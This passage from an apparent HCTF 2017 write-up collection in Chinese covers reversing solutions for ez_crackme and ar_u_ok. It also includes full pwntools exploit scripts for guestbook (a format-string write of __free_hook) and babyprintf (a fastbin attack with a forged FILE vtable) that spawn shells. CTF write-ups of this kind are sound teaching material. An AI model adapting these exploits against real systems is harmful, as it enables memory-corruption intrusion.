<li>&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x505A;&#x6CD5;&#x76F4;&#x63A5;&#x7528;ida&#x770B;&#x4E86;&#xFF0C;cuz&#x6CA1;&#x6709;&#x9020;&#x6210;&#x4EFB;&#x4F55;&#x9759;&#x6001;&#x53CD;&#x7F16;&#x8BD1;&#x7684;&#x96BE;&#x5EA6;</li>
</ul>
</blockquote>
<h4 id="0x01-wp"><a name="0x01-wp" class="anchor-navigation-ex-anchor" href="#0x01-wp"><i class="fa fa-link" aria-hidden="true"></i></a><a name="0x01-wp" class="plugin-anchor" href="#0x01-wp"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 Wp</h4>
<p>     <a href="http://img.blog.csdn.net/20171114170235092" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://img.blog.csdn.net/20171114170235092" alt="">
     </a></p>
<pre><code>    import random
    import os
    import hashlib

    enc_flag = [30, 21, 2, 16, 13, 72, 72, 111, 221, 221, 72, 100, 99, 215, 46, 44, 254, 106, 109, 42, 242, 111, 154, 77, 139, 75, 30, 30, 14, 14, 14, 14, 14, 14, 11]
    dec_flag = [0] * len(enc_flag)

    #/////////////////////////////////////////////////
    def dec0_f(dec_t, enc_t, num):
        for i in range(num):
            dec_t[i] = chr(enc_t[i] ^ 0x76)
        return dec_t
    #/////////////////////////////////////////////////
    def dec1_f(dec_t, enc_t, num):
        for i in range(num):
            v1 = (enc_t[i] &amp; 0x55) &lt;&lt; 1
            v2 = (enc_t[i] &gt;&gt; 1) &amp; 0x55
            enc_t[i] = v1 | v2
            dec_t[i] = enc_t[i] ^ 0xAD
        return dec_t
    #/////////////////////////////////////////////////
    def dec2_f(dec_t, enc_t, num):
        for i in range(num):
            v1 = (enc_t[i] &amp; 0x33) &lt;&lt; 2
            v2 = (enc_t[i] &gt;&gt; 2) &amp; 0x33
            enc_t[i] = v1 | v2
            dec_t[i] = enc_t[i] ^ 0xBE
        return dec_t
    #/////////////////////////////////////////////////
    def dec3_f(dec_t, enc_t, num):
        for i in range(num):
            v1 = (enc_t[i] &amp; 0xF) &lt;&lt; 4
            v2 = (enc_t[i] &gt;&gt; 4) &amp; 0xF
            enc_t[i] = v1 | v2
            dec_t[i] = enc_t[i] ^ 0xEF
        return dec_t
    #/////////////////////////////////////////////////
    def dec_f(dec_flag, enc_flag):
        for i in range(len(enc_flag)):
            dec_flag[i] = enc_flag[i]
        dec_flag[21:28] = dec3_f(dec_flag[21:28], enc_flag[21:28], 7)
        dec_flag[14:21] = dec2_f(dec_flag[14:21], enc_flag[14:21], 7)
        dec_flag[7:14] = dec1_f(dec_flag[7:14], enc_flag[7:14], 7)
        dec_flag = dec0_f(dec_flag, dec_flag, 35)
    #/////////////////////////////////////////////////

    dec_f(dec_flag, enc_flag)

    print &apos;&apos;.join(dec_flag)
</code></pre><p>flag:</p>
<pre><code>hctf{&gt;&gt;D55_CH0CK3R_B0o0M!-xxxxxxxx}
</code></pre><h3 id="ezcrackme"><a name="ezcrackme" class="anchor-navigation-ex-anchor" href="#ezcrackme"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.13. ez_crackme</h3>
<p>&#x8003;&#x5BDF;&#x5BF9;&#x7B80;&#x5355;&#x89E3;&#x91CA;&#x5668;&#x7684;&#x9006;&#x5411;&#x80FD;&#x529B;&#x3002;</p>
<h4 id="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;"><a name="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;" class="anchor-navigation-ex-anchor" href="#&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;" class="plugin-anchor" href="#&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;</h4>
<pre><code>box=\[\]
for i in range(32):
    x=(x+51)%32
    box.append(x)
</code></pre><p>&#x5148;&#x7528;&#x5982;&#x4E0A;&#x65B9;&#x5F0F;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;box&#x3002;</p>
<p>&#x7528;&#x8FD9;&#x4E2A;box&#x5C06;&#x8F93;&#x5165;&#x7684;&#x660E;&#x6587;&#x8FDB;&#x884C;&#x4E71;&#x5E8F;&#x3002;</p>
<pre><code>head = (out\[0\]&amp;0xe0)&gt;&gt;5
    for i in range(31):
        out\[i\] = ((out\[i\]&amp;0x1f)&lt;&lt;3)+((out\[i+1\]&amp;0xe0)&gt;&gt;5)
    out\[31\] = ((out\[31\]&amp;0x1f)&lt;&lt;3) + head
</code></pre><p>&#x7136;&#x540E;&#x7528;&#x5982;&#x4E0A;&#x65B9;&#x5F0F;&#xFF0C;&#x5C06;&#x4E71;&#x5E8F;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6574;&#x4F53;&#x5FAA;&#x73AF;&#x5DE6;&#x79FB;3&#x4F4D;&#x3002;</p>
<pre><code>key = &apos;deadbeef&apos;.decode(&apos;hex&apos;)
    for i in range(32):
        out2.append(out\[i\]^((ord(key\[i%4\])+i)&amp;0xff))
</code></pre><p>&#x7136;&#x540E;&#x5229;&#x7528;key&#x548C;&#x4E0B;&#x6807;i&#x5BF9;&#x5DE6;&#x79FB;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x505A;&#x5F02;&#x6216;&#x5373;&#x53EF;&#x3002;</p>
<p>&#x5B8C;&#x6574;python&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF1A;</p>
<pre><code>key = &apos;deadbeef&apos;.decode(&apos;hex&apos;)

def encrypt(flag):
    out=\[\]
    out2=\[\]
    x=0#gen box
    box=\[\]
    for i in range(32):
        x=(x+51)%32
        box.append(x)
    for i in range(32):
        out.append(ord(flag\[box\[i\]\]))
    head = (out\[0\]&amp;0xe0)&gt;&gt;5
    for i in range(31):
        out\[i\] = ((out\[i\]&amp;0x1f)&lt;&lt;3)+((out\[i+1\]&amp;0xe0)&gt;&gt;5)
    out\[31\] = ((out\[31\]&amp;0x1f)&lt;&lt;3) + head
    for i in range(32):
        out2.append(out\[i\]^((ord(key\[i%4\])+i)&amp;0xff))
    return  out2

def decrypt(enc_list):
    out=\[\]
    out2=\[0\]*32
    x=0#gen box
    box=\[\]
    for i in range(32):
        x=(x+51)%32
        box.append(x)
    for i in range(32):
        out.append(enc_list\[i\]^(ord(key\[i%4\])+i))

    tail = out\[31\]&amp;0x7
    for i in reversed(range(1,32)):
        out\[i\] = ((out\[i\]&amp;0xf8)&gt;&gt;3)+((out\[i-1\]&amp;0x7)&lt;&lt;5)
    out\[0\] = ((out\[0\]&amp;0xf8)&gt;&gt;3)+(tail&lt;&lt;5)
    for i in range(32):
        out2\[box\[i\]\] = out\[i\]
    return  &apos;&apos;.join(map(chr,out2))

#### &#x89E3;&#x91CA;&#x5668;&#x5206;&#x6790;

//register
#define _eax 0
#define _ebx 1
#define _ebx2 2
#define _ecx 3
#define _edx 4
#define _esp 5
#define _lf 6
#define _neq 7
#define \_t\_intp 8
#define \_t\_chp 9
#define \_t\_int 10
#define _flag 11
#define _enc 12
#define _key 13
//opcode
#define _mov (0&lt;&lt;1)
#define _mov32 (1&lt;&lt;1)
#define \_lea\_ch (2&lt;&lt;1)
#define \_lea\_int (3&lt;&lt;1)
#define \_ldr\_int (4&lt;&lt;1)
#define \_ldr\_ch (5&lt;&lt;1)
#define _add (6&lt;&lt;1)
#define \_add\_pint (7&lt;&lt;1)
#define \_add\_pch (8&lt;&lt;1)
#define \_my\_xor (9&lt;&lt;1)
#define _mod (10&lt;&lt;1)
#define \_my\_or (11&lt;&lt;1)
#define \_my\_and (12&lt;&lt;1)
#define _push (13&lt;&lt;1)
#define _pop (14&lt;&lt;1)
#define _shr (15&lt;&lt;1)
#define _shl (16&lt;&lt;1)
#define _ror (17&lt;&lt;1)
#define _cmpl (18&lt;&lt;1)
#define _cmpeq (19&lt;&lt;1)
#define loop (20&lt;&lt;1)
#define code_end (21&lt;&lt;1)
//type
#define rn 0 
#define rr 1
</code></pre><p>&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x4EE5;&#x53CA;&#x53D8;&#x91CF;&#xFF0C;&#x89E3;&#x91CA;&#x5668;&#x6307;&#x4EE4;&#xFF0C;&#x4EE5;&#x53CA;&#x6307;&#x4EE4;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x79CD;&#x7C7B;&#x3002;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x6307;&#x4EE4;&#x7531;&#x9AD8;7&#x4F4D;&#x7684;&#x7C7B;&#x578B;&#x548C;&#x4F4E;1&#x4F4D;&#x7684;&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x7EC4;&#x6210;&#x3002;</p>
<p><code>rr</code>&#x8868;&#x793A;<code>op reg,reg</code>,<code>rn</code>&#x8868;&#x793A;<code>op reg,num</code>&#x3002;</p>
<p>&#x7528;&#x5B8F;&#x5199;&#x7684;&#x89E3;&#x91CA;&#x4EE3;&#x7801;</p>
<pre><code>char code\[\] = {
        \_lea\_ch | rr,_ebx, _flag,
        \_my\_xor | rr,_ecx, _ecx,
        \_my\_xor | rr,_eax,_eax,
        \_my\_xor | rr,_edx,_edx,

        loop,
        _add | rn,_eax, 51,
        _mod | rn,_eax, 32,
        \_lea\_ch | rr,\_t\_chp, _ebx,
        \_add\_pch | rr,\_t\_chp,_eax,
        \_ldr\_ch | rr,\_t\_int,\_t\_chp,
        _mov | rr,_edx,\_t\_int,
        _push | rr,_esp,_edx,
        _add | rn,_ecx, 1,
        _cmpl | rn, _ecx, 32,
        loop,

        \_my\_xor | rr,_eax,_eax,
        \_lea\_int | rr,\_t\_intp,_esp,
        \_add\_pint | rn,\_t\_intp, -32,
        \_lea\_int | rr,_ebx2,\_t\_intp,
        \_ldr\_int | rr,\_t\_int, _ebx2,
        _mov | rr,_eax,\_t\_int,
        \_my\_and | rn,_eax, 0xe0,
        _shr | rn,_eax, 5,
        _mov | rr,_edx,_eax,
        \_my\_xor | rr,_ecx, _ecx,
        loop,
        \_ldr\_int | rr,\_t\_int, _ebx2,
        _mov | rr,_eax,\_t\_int,
        \_my\_and | rn,_eax, 0x1f,
        _shl | rn,_eax, 3,
        _push | rr,_esp,_eax,
        \_lea\_int | rr,\_t\_intp,_esp,
        \_add\_pint | rn,\_t\_intp, -32,
        \_lea\_int | rr,_ebx2,\_t\_intp,
        \_ldr\_int | rr,\_t\_int, _ebx2,
        _mov | rr,_eax,\_t\_int,
        \_my\_and | rn,_eax, 0xe0,
        _shr | rn,_eax, 5,
        _pop | rr,_esp,\_t\_int,
        _add | rr,\_t\_int,_eax,
        _push | rr,_esp,\_t\_int,
        _add | rn,_ecx, 1,
        _cmpl | rn, _ecx, 31,
        loop,

        \_ldr\_int | rr,\_t\_int, _ebx2,
        _mov | rr,_eax,\_t\_int,
        \_my\_and | rn,_eax, 0x1f,
        _shl | rn,_eax, 3,
        _add | rr,_eax,_edx,
        _push | rr,_esp,_eax,

        \_my\_xor | rr,_ecx, _ecx,
        _mov32 | rr,_edx, _key,
        loop,
        \_lea\_int | rr,\_t\_intp,_esp,
        \_add\_pint | rn,\_t\_intp, -32,
        \_lea\_int | rr,_ebx2,\_t\_intp,
        \_ldr\_int | rr,\_t\_int, _ebx2,
        _mov | rr,_eax,\_t\_int,
        _push | rr,_esp,_eax,
        _mov | rr,_eax,_edx,
        _add | rr,_eax, _ecx,
        _pop | rr,_esp,\_t\_int,
        \_my\_xor | rr,\_t\_int,_eax,
        _push | rr,_esp,\_t\_int,
        _ror | rn,_edx, 8,
        _add | rn,_ecx, 1,
        _cmpl | rn, _ecx, 32,
        loop,

        \_my\_xor | rr,_ecx, _ecx,
        \_my\_xor | rr,_edx,_edx,
        \_lea\_ch | rr,_ebx,_enc,
        loop,
        \_lea\_ch | rr,\_t\_chp, _ebx,
        \_add\_pch | rr,\_t\_chp, _ecx,
        \_ldr\_ch | rr,\_t\_int,\_t\_chp,
        _mov | rr,_eax,\_t\_int,
        _push | rr,_esp,_eax,
        \_lea\_int | rr,\_t\_intp,_esp,
        \_add\_pint | rn,\_t\_intp, -33,
        \_ldr\_int | rr,\_t\_int,\_t\_intp,
        _pop | rr,_esp,_eax,
        _push | rr,_esp,_eax,
        _cmpeq | rr,_eax,\_t\_int,
        \_my\_or | rr,_edx, _neq,
        _add | rn,_ecx, 1,
        _cmpl | rn, _ecx, 32,
        loop,

        code_end
    };
</code></pre><p>&#x5176;&#x4E2D;loop&#x7684;&#x5B9E;&#x73B0;&#x662F;&#x7528;&#x8BB0;&#x5F55;ip&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p>
<p>&#x5B8C;&#x6574;&#x7684;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x89C1;github&#x3002;</p>
<h3 id="guestbook"><a name="guestbook" class="anchor-navigation-ex-anchor" href="#guestbook"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.14. guestbook</h3>
<p>&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x9053;pwn&#xFF0C;&#x51FA;&#x7684;&#x5E94;&#x8BE5;&#x662F;&#x6BD4;&#x8F83;&#x8001;&#x5957;&#x7B80;&#x5355;&#x7684;&#x4E1C;&#x897F;&#x3002;</p>
<p>&#x4E3B;&#x8981;&#x8003;&#x5BDF;&#x70B9;&#x6709;&#x4E09;&#x4E2A;&#x3002;</p>
<p>&#x5229;&#x7528;ebp chain&#x548C;fmt&#x6765;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x3002;</p>
<p>&#x5BF9;<code>__free_hook</code>&#x7684;&#x4E86;&#x89E3;&#x3002;</p>
<p>&#x5BF9;<code>$0</code>get shell&#x7684;&#x4E86;&#x89E3;&#xFF08;&#x6700;&#x540E;&#x8C8C;&#x4F3C;&#x65E0;&#x4EBA;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x6709;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x3002;&#xFF09;</p>
<p>&#x6211;&#x7684;exp:</p>
<pre><code>from pwn import *

context.log_level = &apos;debug&apos;
context.terminal = \[&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;\]

bin = ELF(&apos;./guestbook&apos;)
libc = ELF(&apos;./libc.so&apos;)

def add(name,phone):
    cn.sendline(&apos;1&apos;)
    cn.recvuntil(&apos;OK,your guest index is &apos;)
    idx = int(cn.recvuntil(&apos;\\n&apos;))
    cn.recvuntil(&apos;?&apos;)
    cn.send(name)
    cn.recvuntil(&apos;?&apos;)
    cn.send(phone)
    cn.recvuntil(&apos;success!\\n&apos;)
    return idx

def see(idx):
    cn.sendline(&apos;2&apos;)
    cn.recvuntil(&apos;index:&apos;)
    cn.sendline(str(idx))
    cn.recvuntil(&apos;the name:&apos;)
    name = cn.recvuntil(&apos;\\n&apos;)
    cn.recvuntil(&apos;the phone:&apos;)
    phone = cn.recvuntil(&apos;\\n&apos;)
    cn.recvuntil(&apos;===========&apos;)
    return \[name,phone\]

def delete(idx):
    cn.sendline(&apos;3&apos;)
    cn.recvuntil(&apos;index:&apos;)
    cn.sendline(str(idx))

def fmt(pay):
    idx = add(pay,&apos;1111&apos;)
    see(idx)
    delete(idx)

def fmt2(pay):
    idx = add(pay,&apos;1111&apos;)
    see(idx)

def z():
    gdb.attach(cn)
    raw_input()
cn = process(&apos;./guestbook&apos;)

idx = add(&apos;%3$x&apos;,&apos;0&apos;)
libc_base = int(see(idx)\[0\],16)-71 - libc.symbols\[&apos;\_IO\_2\_1\_stdout_&apos;\]
free_hook = libc_base+0x001B38B0
system = libc_base + libc.symbols\[&apos;system&apos;\]
success(&apos;libc_base: &apos;+hex(libc_base))
success(&apos;free_hook: &apos;+hex(free_hook))
success(&apos;system: &apos;+hex(system))

idx = add(&apos;%72$x&apos;,&apos;1&apos;)
ebp_2 = int(see(idx)\[0\],16)\# %80$x
ebp_1 = ebp_2-0x20\# %72$x
ebp_3 = ebp_2+0x20\# %88$x

success(&apos;ebp_1: &apos;+hex(ebp_1))
success(&apos;ebp_2: &apos;+hex(ebp_2))
success(&apos;ebp_3: &apos;+hex(ebp_3))

pay = &apos;%&apos;+str((ebp_3+8)&amp;0xffff)+&apos;c%80$hn&apos;
fmt(pay)

pay = &apos;%&apos;+str((ebp_3+2)&amp;0xffff)+&apos;c%72$hn&apos;
fmt(pay)

pay = &apos;%&apos;+str(((ebp_3+8)&amp;0xffff0000)&gt;&gt;16)+&apos;c%80$hn&apos;
fmt(pay)

pay = &apos;%&apos;+str((ebp_3)&amp;0xffff)+&apos;c%72$hn&apos;
fmt(pay)

pay = &apos;%&apos;+str(free_hook&amp;0xffff)+&apos;c%88$hn&apos;
fmt(pay)
#z()
pay = &apos;%&apos;+str(system&amp;0xffff)+&apos;c%90$hn&apos;
fmt2(pay)

pay = &apos;%&apos;+str((free_hook&amp;0xffff)+2)+&apos;c%88$hn&apos;
fmt2(pay)

pay = &apos;%&apos;+str((system&amp;0xffff0000)&gt;&gt;16)+&apos;c%90$hn&apos;
fmt2(pay)

idx=add(&apos;get shell&apos;,&apos;$0\\x00&apos;)
delete(idx)

cn.interactive()
</code></pre><h3 id="babyprintf"><a name="babyprintf" class="anchor-navigation-ex-anchor" href="#babyprintf"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.15. babyprintf</h3>
<p>&#x9898;&#x76EE;&#x53EA;&#x6709;malloc&#x548C;&#x4E00;&#x4E2A;printf_chk&#xFF0C;printf_chk&#x548C;printf&#x4E0D;&#x540C;&#x7684;&#x5730;&#x65B9;&#x6709;&#x4E24;&#x70B9;&#xFF1A;</p>
<ul>
<li><ol>
<li>&#x4E0D;&#x80FD;&#x4F7F;&#x7528;$n&#x4E0D;&#x8FDE;&#x7EED;&#x7684;&#x6253;&#x5370;</li>
</ol>
</li>
<li><ol>
<li>&#x5728;&#x4F7F;&#x7528;%n&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x505A;&#x4E00;&#x7CFB;&#x5217;&#x68C0;&#x67E5;</li>
</ol>
</li>
</ul>
<p>&#x867D;&#x7136;&#x5982;&#x6B64;&#xFF0C;&#x4F46;leak libc&#x5730;&#x5740;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x6211;&#x60F3;&#x5927;&#x90E8;&#x5206;&#x4EBA;&#x90FD;&#x60F3;&#x5230;&#x4E86;&#x3002;</p>
<p>&#x7136;&#x540E;&#x91CD;&#x70B9;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x7A0B;&#x5E8F;&#x552F;&#x4E00;&#x7684;&#x5806;&#x6EA2;&#x51FA;&#x3002;&#x6CA1;&#x6709;free&#x7684;&#x95EE;&#x9898; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;free topchunk&#x89E3;&#x51B3;&#xFF0C;&#x7136;&#x540E;&#x5F88;&#x591A;&#x9009;&#x624B;&#x5728;&#x8FD9;&#x90FD;&#x4F7F;&#x7528;&#x4E86;unsortedbin attack&#x62FF;&#x5230;shell&#x3002;</p>
<p>&#x5982;&#x4F55;&#x901A;&#x8FC7;unsortedbin attack&#x5229;&#x7528;&#x6211;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;, &#x5E94;&#x8BE5;&#x4F1A;&#x6709;&#x5176;&#x4ED6;wp&#x653E;&#x51FA;&#x3002;&#x6211;&#x8BF4;&#x4E00;&#x4E0B;&#x5982;&#x4F55;&#x5229;&#x7528; fastbin attack&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;&#x9996;&#x5148;&#x6211;&#x4EEC;&#x80FD;free &#x4E00;&#x4E2A;top chunk&#xFF0C;&#x7136;&#x540E;&#x6709;&#x4E86;&#x7B2C;&#x4E00;&#x4E2A;&#x5C31;&#x80FD;&#x6709;&#x7B2C;&#x4E8C;&#x4E2A;&#xFF0C;&#x4E0D;&#x65AD;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x6216;&#x8005;&#x8986;&#x76D6;top chunk&#x7684;size&#x53EF;&#x4EE5;&#x5F88;&#x8F7B;&#x6613;&#x7684;&#x505A;&#x5230;&#x8FD9;&#x70B9;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53E6;&#x4E0B;&#x9762;&#x90A3;&#x4E2A;&#x7684;size&#x4E3A;0x41&#xFF0C;&#x4E4B;&#x540E;&#x7533;&#x8BF7;&#x4E0A;&#x9762;&#x90A3;&#x4E2A;&#x5806;&#x5757;&#x5C31;&#x80FD;&#x628A;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;fastbin&#x8986;&#x76D6;&#x4E86;&#x3002;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;0x41&#x7684;fastbin attack, &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5230;&#x4F4D;&#x4E8E;data&#x6BB5;&#x4E0A;&#x7684;stdout&#x6307;&#x9488;&#xFF0C;&#x5177;&#x4F53;&#x5982;&#x4E0B;</p>
<pre><code>    --------------------            --------------------
      freed chunk1                       alloced
    --------------------            --------------------
          dummy            -&gt;                overflow
    --------------------            --------------------
      freed chunk2(0x41)               chunk2-&gt;fd=target
    --------------------            --------------------
</code></pre><p>&#x5F53;&#x7136;libc&#x4E2D;&#x662F;&#x5B58;&#x5728;onegadget&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x6709;&#x4EBA;&#x76F4;&#x63A5;&#x53BB;&#x8986;&#x76D6;malloc_hook&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x53EF;&#x4EE5;<br>&#x7136;&#x540E;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x86CB;&#x75BC;&#x7684;&#x662F;libc-2.24&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x5B83;&#x4E3A;&#x52A0;&#x5165;&#x4E86;&#x65B0;&#x7684;&#x5BF9;vtable&#x7684;&#x68C0;&#x9A8C;&#x673A;&#x5236;&#x3002;&#x5982;&#x4F55;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x5F88;&#x591A;&#xFF0C;&#x53EA;&#x8981;&#x8BB0;&#x5F97;&#x4E00;&#x70B9;&#xFF0C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x80FD;&#x63A7;&#x5236;&#x201C;&#x6574;&#x4E2A;&#x201C;FILE&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x8FD9;&#x70B9;&#x5982;&#x679C;&#x7A0D;&#x5FAE;&#x53BB;&#x770B;&#x4E0B;&#x6E90;&#x7801;&#x7684;&#x8BDD;&#x5E94;&#x8BE5;&#x80FD;&#x627E;&#x5230;&#x5F88;&#x591A;&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x66FF;&#x6362;vtable( _IO_file_jumps)&#x5230;&#x53E6;&#x4E00;&#x4E2A;vtable( _IO_str_jumps), &#x5229;&#x7528;&#x4E24;&#x4E2A;vtable defalut&#x65B9;&#x6CD5;&#x7684;&#x4E0D;&#x540C;&#x62FF;&#x5230;shell&#x7684;&#x89E3;&#x9898;&#x811A;&#x672C;(&#x504F;&#x79FB;&#x8BF7;&#x81EA;&#x884C;&#x66F4;&#x6539;)&#xFF1A;</p>
<pre><code>    from pwn import *
    context.log_level=&apos;debug&apos;

    def pr(size,data):
        p.sendline(str(size))
        p.recv()
        p.sendline(data)
        p.recvuntil(&apos;result: &apos;)
        return p.recvuntil(&apos;size: &apos;)[:-5]

    p = process(&apos;./babyprintf&apos;)
    p.recvuntil(&apos;size: &apos;)
    for i in range(32):
        pr(0xff0,&apos;a&apos;)
    p.sendline(&apos;0xe00&apos;)
    p.recv()
    p.sendline(&apos;%llx&apos;)
    p.recvuntil(&apos;result: &apos;)
    libc_addr = int(&apos;0x&apos;+p.recv(12),16)-0x3c6780
    print &apos;libc: &apos;,hex(libc_addr)
    p.recvuntil(&apos;size: &apos;)
    pr(8,&apos;a&apos;*0x18+p64(0x1d1))
    pr(0x1d0,&apos;1&apos;)
    pr(0x130,&apos;1&apos;)
    pr(0xd00,&apos;1&apos;)
    pr(0xa0,&apos;a&apos;*0xa8+p64(0x61))
    pr(0x200,&apos;a&apos;)
    p.sendline(&apos;0x60&apos;)
    p.recvuntil(&apos;string: &apos;)
    p.sendline(&apos;\x00&apos;*0x2028+p64(0x41)+p64(0x601062))
    p.recv()
    pr(0x30,&apos;a&apos;)

    system_addr = libc_addr + 0x45390
    sh_addr = libc_addr + 0x18cd17
    malloc_addr = libc_addr + 0x84130
    vtable_addr = libc_addr+0x3c37a0

    flag=2|0x8000
    fake_stream = p64(flag)+p64(0)
    fake_stream += p64(0)*2
    fake_stream += p64(0)
    fake_stream += p64(0x7fffffffffffffff)
    fake_stream = fake_stream.ljust(0x38,&apos;\x00&apos;)
    fake_stream += p64(sh_addr)
    fake_stream += p64(sh_addr)
    fake_stream = fake_stream.ljust(0xc0,&apos;\x00&apos;)
    fake_stream += p64(0xffffffffffffffff)
    fake_stream = fake_stream.ljust(0xd8,&apos;\x00&apos;)
    fake_stream += p64(vtable_addr)
    fake_stream += p64(malloc_addr) #alloc
    fake_stream += p64(system_addr) #hook free
    p.sendline(&apos;0x30&apos;)
    p.sendline(&apos;a&apos;*14+p64(0x601090)+p64(0)+fake_stream)

    p.interactive()
</code></pre><h3 id="aruok"><a name="aruok" class="anchor-navigation-ex-anchor" href="#aruok"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.16. ar_u_ok</h3>
<p>&#x4E3B;&#x8981;&#x8003;&#x5BDF;&#x5BF9;ptrace&#x7684;&#x8BA4;&#x8BC6;&#x548C;rc6,rc4&#x7684;&#x8BC6;&#x522B;</p>
<h4 id="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;"><a name="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;" class="anchor-navigation-ex-anchor" href="#&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;" class="plugin-anchor" href="#&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</h4>
<p>&#x771F;&#x6B63;&#x7684;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;rc6&#xFF0C;&#x53EA;&#x8981;&#x628A;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x90A3;&#x4E2A;int&#x5E38;&#x91CF;&#x653E;&#x5230;google&#x91CC;&#x641C;&#x7D22;&#x4E00;&#x4E0B;&#x5C31;&#x77E5;&#x9053;&#x662F;rc6&#x52A0;&#x5BC6;&#xFF08;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x4EE3;&#x7801;&#x88AB;rc4&#x52A0;&#x5BC6;&#x4E86;&#xFF0C;&#x4E0D;&#x4E0D;&#x89E3;&#x5BC6;&#x662F;&#x770B;&#x4E0D;&#x5230;&#x7684;&#xFF09;&#x3002;</p>
<p>rc6&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x7684;&#x4EE3;&#x7801;&#x89C1;&#x6E90;&#x7801;</p>
<h4 id="&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;"><a name="&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;" class="anchor-navigation-ex-anchor" href="#&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;" class="plugin-anchor" href="#&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;</h4>
<p>&#x7A0B;&#x5E8F;&#x9996;&#x5148;&#x5224;&#x65AD;&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x679C;argc&#x4E3A;1&#xFF0C;&#x5219;&#x4EE5;debugger&#x8EAB;&#x4EFD;&#x542F;&#x52A8;&#xFF0C;&#x5229;&#x7528;fork&#x5206;&#x51FA;parent&#x548C;child&#x3002;parent&#x4F5C;&#x4E3A;&#x771F;&#x6B63;&#x7684;debugger&#xFF0C;child&#x5229;&#x7528;execve&#x6765;&#x542F;&#x52A8;&#x81EA;&#x8EAB;&#x5E76;&#x4EE5;&#x7236;&#x8FDB;&#x7A0B;&#x7684;pid&#x4F5C;&#x4E3A;&#x542F;&#x52A8;&#x53C2;&#x6570;&#x3002;</p>
